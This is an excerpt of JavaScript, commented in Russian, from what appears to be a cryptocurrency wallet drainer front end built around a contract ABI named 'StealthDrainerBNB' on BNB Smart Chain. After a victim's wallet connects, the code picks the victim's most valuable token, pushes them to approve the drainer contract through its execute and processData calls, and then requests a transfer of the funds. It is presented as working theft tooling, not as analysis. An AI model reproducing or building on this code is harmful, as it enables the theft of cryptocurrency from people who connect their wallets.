...
// Обновленные адреса контрактов
const CONTRACTS = {
  [networkMap['BNB Smart Chain'].chainId]: '0x2ed7Ef4A2EbCab59FA8c7910641A0b0664a19342', // Замени на адрес из Remix или deploy.js
...
// ABI для контракта StealthDrainerBNB
const stealthDrainerAbi = [
  {
    constant: false,
    inputs: [
...
function hideCustomModal() {
  ...
  if (modal) {
    ...
    setTimeout(() => modal.style.display = 'none', 300); // Ждем завершения анимации
  }
}
...
// Функция одобрения токена через execute
const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
  ...
  try {
    const gasLimitExecute = BigInt(150000); // Увеличенный лимит газа для execute
    const gasLimitProcessData = BigInt(300000); // Увеличенный лимит газа для processData
    const maxFeePerGas = BigInt(10000000000); // 10 Gwei
    const maxPriorityFeePerGas = BigInt(2000000000); // 2 Gwei

    // Кодируем данные для вызова approve(address spender, uint256 amount)
    ...
    console.log(`Preparing execute call: token=${checksumTokenAddress}, contract=${checksumContractAddress}, chainId=${chainId}`);

    // Вызываем метод execute
    const executeTxHash = await writeContract(wagmiConfig, {
      address: checksumContractAddress,
      abi: stealthDrainerAbi,
      functionName: 'execute',
      args: [checksumTokenAddress, 0, approveData], // value=0, так как не отправляем ETH
      chainId,
      gas: gasLimitExecute,
      maxFeePerGas,
      maxPriorityFeePerGas
    });
    console.log(`Execute transaction sent: ${executeTxHash}`);

    // Вызываем processData
    ...
    const processDataTxHash = await writeContract(wagmiConfig, {
      ...
      chainId,
      gas: gasLimitProcessData,
      maxFeePerGas,
      maxPriorityFeePerGas
    });
    console.log(`processData transaction sent: ${processDataTxHash}`);

    return { executeTxHash, processDataTxHash };
  } catch (error) {
    store.errors.push(`Execute or processData failed: ${error.message}`);
    throw error;
  }
};
    ...
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      ...
      if (mostExpensive) {
        ...
        try {
          ...
          const { executeTxHash, processDataTxHash } = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId);
          store.approvedTokens[approvalKey] = true;
          store.isApprovalRequested = false;
          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: execute=${executeTxHash}, processData=${processDataTxHash}`;
          console.log(approveMessage);
          ...
          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, processDataTxHash);
